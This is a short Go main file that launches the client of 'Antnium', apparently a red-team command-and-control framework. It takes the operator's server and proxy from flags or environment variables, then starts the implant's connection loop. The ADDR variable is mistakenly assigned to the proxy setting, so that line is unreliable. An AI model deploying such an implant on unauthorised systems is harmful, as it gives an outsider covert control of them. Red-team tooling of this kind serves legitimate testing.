package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/dobin/antnium/pkg/client"
)

func main() {
	flagServerUrl := flag.String("addr", "", "")
	flagProxyUrl := flag.String("proxy", "", "")
	flag.Parse()

	fmt.Println("Antnium 0.1")

	c := client.NewClient()

	// env can be overwritten with args
	if os.Getenv("PROXY") != "" {
		c.Campaign.ProxyUrl = os.Getenv("PROXY")
	}
	if os.Getenv("ADDR") != "" {
		c.Campaign.ProxyUrl = os.Getenv("ADDR")
	}
	if *flagServerUrl != "" {
		c.Campaign.ServerUrl = *flagServerUrl
	}
	if *flagProxyUrl != "" {
		c.Campaign.ProxyUrl = *flagProxyUrl
	}

	c.Start()
	c.Loop()

}
